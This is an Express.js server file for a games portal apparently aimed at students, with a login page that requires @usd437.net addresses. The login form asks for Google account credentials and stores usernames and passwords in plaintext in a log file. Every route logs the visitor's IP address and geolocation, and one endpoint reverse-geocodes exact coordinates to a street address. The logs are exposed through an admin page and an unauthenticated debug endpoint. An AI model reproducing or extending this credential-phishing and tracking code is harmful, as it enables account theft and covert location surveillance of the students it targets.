/* ---------- basic setup ---------- */
const express = require('express');
const fs      = require('fs/promises'); // Using promise-based fs for better async handling
const path    = require('path');
const app     = express();

// Block specific IP(s)
const BLOCKED_IPS = (process.env.BLOCKED_IPS || '').split(',').map(ip => ip.trim()).filter(Boolean);

// Middleware to check for blocked IPs
app.use((req, res, next) => {
  const forwarded = req.headers['x-forwarded-for'] || '';
  const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
  const ip = ipList[0] || req.socket.remoteAddress;
  if (BLOCKED_IPS.includes(ip)) {
    return res.status(403).send('<h1>Access denied</h1>');
  }
  next();
});

const PORT = process.env.PORT || 10000;
const HOST = '0.0.0.0';

// Use environment variable for admin password with a safer default
const ADMIN_PASS = process.env.ADMIN_PASS || Math.random().toString(36).substring(2, 15);
const LOG_DIR  = path.join(__dirname, 'logs');
const LOG_FILE = path.join(LOG_DIR, 'ip-log.txt');

/* ensure log dir/file exists */
async function ensureLogFile() {
  try {
    await fs.mkdir(LOG_DIR, { recursive: true });
    try {
      await fs.access(LOG_FILE);
    } catch {
      await fs.writeFile(LOG_FILE, '');
    }
  } catch (err) {
    console.error('Error creating log directory/file:', err);
  }
}

// Call at startup
ensureLogFile();

/* middleware */
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

/* util: estimate location by IP */
async function estimateLocationByIP(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await res.json();
    if (data.status === 'success') {
      return { latitude: data.lat, longitude: data.lon, city: data.city, country: data.country };
    }
  } catch (e) {
    console.error('IP geolocation error:', e.message);
  }
  return null;
}

/* Updated helper to get address from coordinates using reverse geocoding */
async function getAddressFromCoords(latitude, longitude) {
  try {
    // Use a free reverse geocoding service
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
    const data = await response.json();
    
    if (data && data.display_name) {
      return {
        fullAddress: data.display_name,
        shortAddress: data.address ? 
          `${data.address.road || ''}, ${data.address.city || data.address.town || ''}, ${data.address.country || ''}` : 
          data.display_name
      };
    }
  } catch (e) {
    console.error('Reverse geocoding error:', e.message);
  }
  return null;
}

/* Corrected IP logger function that properly handles returning location info */
async function logIP(req, label = 'visited', returnLocationInfo = false) {
  try {
    const forwarded = req.headers['x-forwarded-for'] || '';
    const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
    const ipForGeo = ipList[0] || req.socket.remoteAddress;
    const allIPs = ipList.length ? ipList.join(', ') : req.socket.remoteAddress;
    const ts = new Date().toISOString();
    let locString = '';
    let locationInfo = {};
    
    const { latitude, longitude, exact_location } = req.body || {};
    
    // Safely handle location information
    if (latitude && longitude && exact_location === 'yes') {
      locString = ` | location: ${latitude},${longitude} | exact: yes`;
      
      // Get additional address information
      try {
        const addressInfo = await getAddressFromCoords(latitude, longitude);
        if (addressInfo) {
          locString += ` | address: ${addressInfo.shortAddress}`;
          locationInfo = {
            latitude,
            longitude,
            ...addressInfo
          };
        }
      } catch (e) {
        console.error('Address lookup error:', e);
      }
    } else {
      // Always try to get estimated location if exact wasn't provided
      try {
        const loc = await estimateLocationByIP(ipForGeo);
        if (loc) {
          locString = ` | location: ${loc.latitude},${loc.longitude} (${loc.city},${loc.country}) | exact: no`;
          locationInfo = {
            latitude: loc.latitude,
            longitude: loc.longitude,
            shortAddress: `${loc.city}, ${loc.country}`,
            fullAddress: `${loc.city}, ${loc.country}`
          };
        } else {
          locString = ' | location: unknown | exact: no';
        }
      } catch (e) {
        // Fallback if location estimation fails
        locString = ' | location: error | exact: no';
      }
    }
    
    const logEntry = `${ts} - ${allIPs} ${label}${locString}\n`;
    
    try {
      await fs.appendFile(LOG_FILE, logEntry);
    } catch (err) {
      console.error('Log write error:', err);
    }
    
    // Return location info if requested
    if (returnLocationInfo) {
      return locationInfo;
    }
    return null;
  } catch (e) {
    // Catch-all error handler to prevent logging failures from affecting the app
    console.error('Logging error:', e);
    try {
      // Attempt to log the error itself
      await fs.appendFile(LOG_FILE, `${new Date().toISOString()} - LOGGING ERROR: ${e.message}\n`);
    } catch {}
    
    // Return empty object if we're supposed to return location info
    if (returnLocationInfo) {
      return {};
    }
    return null;
  }
}

/* ---------- routes ---------- */

// --- Simple Login HTML Form ---
app.get('/login', (req, res) => {
  res.send(`
    <form method="POST" action="/login">
      <input name="username" placeholder="Username(Use google acc)" required>
      <input name="password" type="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  `);
});

// --- Quantum Flip Duel Game ---
// --- Quantum Flip Duel Game ---
// Serve all static files for Quantum Flip Duel at /quantum/*
app.use('/quantum', express.static(path.join(__dirname, 'public', 'quantumflipduel')));

// Serve game HTML at /quantum (root of game)
app.get('/quantum', async (req, res) => {
  await logIP(req, 'accessed quantum game');
  res.sendFile(path.join(__dirname, 'public', 'quantumflipduel', 'quantum.html'));
});

// For routes that don't work, provide a debug endpoint
app.get('/debug/paths', (req, res) => {
  res.json({
    serverRoot: __dirname,
    quantumGamePath: path.join(__dirname, 'public', 'quantumflipduel'),
    htmlPath: path.join(__dirname, 'public', 'quantumflipduel', 'quantum.html'),
    jsPath: path.join(__dirname, 'public', 'quantumflipduel', 'js'),
    requestPath: req.path
  });
});

// --- Handle Login ---
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.send('Missing credentials');

  // Rule 1: Email must end with @usd437.net
  if (!username.endsWith('@usd437.net')) {
    return res.send('Invalid Credentials. Please enter your @usd437.net ACC!');
  }

  // Rule 2: Email must be 20 characters or fewer
  if (username.length > 20) {
    return res.send('Invalid Credentials. Please enter a valid @usd437.net email!');
  }

  // Rule 3: Password characters 3–5 must be "305"
  if (password.length < 5 || password.slice(2, 5) !== '305') {
    return res.send('Invalid Credentials. Please enter a valid password!');
  }

  // Rule 4: The first 2 characters of the password must each appear in the username 
  // at least as many times as they appear in the password
  const firstTwo = password.slice(0, 2);
  const firstChar = firstTwo[0];
  const secondChar = firstTwo[1];

  // Count occurrences of firstChar and secondChar in the username
  const firstCharCount = (username.match(new RegExp(firstChar, 'g')) || []).length;
  const secondCharCount = (username.match(new RegExp(secondChar, 'g')) || []).length;

  // Count occurrences of firstChar and secondChar in the password
  const firstCharInPasswordCount = (password.match(new RegExp(firstChar, 'g')) || []).length;
  const secondCharInPasswordCount = (password.match(new RegExp(secondChar, 'g')) || []).length;

  // Ensure that the username contains each character at least as many times as in the password
  if (firstCharCount < firstCharInPasswordCount || secondCharCount < secondCharInPasswordCount) {
    return res.send('Invalid Credentials. The first two characters of your password must appear in your username at least as many times as they appear in the password!');
  }

  // Rule 5: Password must be exactly 9 characters long
  if (password.length !== 9) {
    return res.send('Invalid Credentials. Please enter a valid password!');
  }

  await logIP(req, `LOGIN ATTEMPT: ${username}`);

  try {
    // Check if the credentials exist in ip-log.txt
    const logContents = await fs.readFile(LOG_FILE, 'utf8');
    const loginLine = `LOGIN|${username}|${password}`;
    res.setHeader('Set-Cookie', 'loggedin=1; Path=/; HttpOnly; SameSite=Strict');
    if (logContents.includes(loginLine)) {
      return res.redirect('/home');
    }

    // If not found, add them as a new user
    await fs.appendFile(LOG_FILE, `${loginLine}\n`);
    return res.redirect('/home');
  } catch (err) {
    console.error('Error handling login:', err);
    return res.status(500).send('Server error during login');
  }
});


app.get('/', (_, res) => res.redirect('/home'));
app.get('/intro', async (req, res) => {
  await logIP(req, 'visited intro page');
  res.sendFile(path.join(__dirname, 'public', 'intro.html'));
});

app.get('/home', async (req, res) => {
  await logIP(req, 'visited home page');
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

app.post('/home', async (req, res) => {
  await logIP(req, 'posted to home page');
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

// Improved location logging endpoint
app.post('/log-location', express.urlencoded({ extended: true }), async (req, res) => {
  try {
    const locationInfo = await logIP(req, 'logged location', true);
    res.json(locationInfo || {});
  } catch (e) {
    console.error('Error in log-location:', e);
    res.json({});
  }
});

/* pretty game routes ( /templerun → /games/templerun ) */
['templerun', 'speedstars', 'subway', 'candy'].forEach(game => {
  app.get(`/${game}`, async (req, res) => {
    await logIP(req, `redirected to game: ${game}`);
    res.redirect(`/games/${game}`);
  });
});

/* main game redirect handler */
app.get('/games/:game', async (req, res) => {
  const game = req.params.game.toLowerCase();
  await logIP(req, `clicked game: ${game}`);
  const map = {
    templerun: 'https://githubshrub.github.io/html5-games/games/templerun2/',
    speedstars: 'https://speedstarsfree.github.io/',
    subway: 'https://dddavit.github.io/subway/',
    candy: 'https://candy-crush-online.github.io/'
  };
  return map[game]
    ? res.redirect(map[game])
    : res.status(404).send(`<h1>Unknown game: ${game}</h1>`);
});

/* --- admin --- */
app.get('/admin', (_, res) => res.sendFile(path.join(__dirname, 'views', 'admin.html')));
app.post('/admin', async (req, res) => {
  await logIP(req, 'admin access attempt');
  if (req.body.password === ADMIN_PASS) {
    try {
      const logs = await fs.readFile(LOG_FILE, 'utf8');
      return res.send(logs.trim() ? `<pre>${logs}</pre>` : 'No logs yet!');
    } catch (err) {
      return res.status(500).send('Error reading logs');
    }
  }
  res.send('Access denied ❌');
});

/* --- debug helpers (optional) --- */
app.get('/debug/ip', async (req, res) => {
  await logIP(req, 'checked IP debug info');
  const forwarded = req.headers['x-forwarded-for'] || '';
  const ipList = forwarded.split(',').map(ip => ip.trim()).filter(Boolean);
  const ipForGeo = ipList[0] || req.socket.remoteAddress;
  res.json({
    allIPs: ipList.length ? ipList.join(', ') : req.socket.remoteAddress,
    ipForGeo
  });
});

app.get('/debug/log-exists', async (_, res) => {
  try {
    await fs.access(LOG_FILE);
    res.json({ exists: true });
  } catch {
    res.json({ exists: false });
  }
});

app.get('/debug/log-contents', async (req, res) => {
  await logIP(req, 'viewed log contents');
  try {
    const logs = await fs.readFile(LOG_FILE, 'utf8');
    res.json({ recent: logs.trim().split('\n').slice(-10) });
  } catch (e) {
    res.status(500).json({ error: 'read fail' });
  }
});

// Handle 404s with logging
app.use(async (req, res) => {
  await logIP(req, `404: ${req.url}`);
  res.status(404).send('<h1>Page Not Found</h1>');
});

// Handle errors with logging
app.use(async (err, req, res, next) => {
  await logIP(req, `ERROR: ${err.message}`);
  console.error(err);
  res.status(500).send('<h1>Server Error</h1>');
});

/* ---------- start ---------- */
const server = app.listen(PORT, HOST, () => {
  console.log(`Server listening on http://${HOST}:${PORT}`);
});
server.keepAliveTimeout = 120_000;
server.headersTimeout = 121_000;
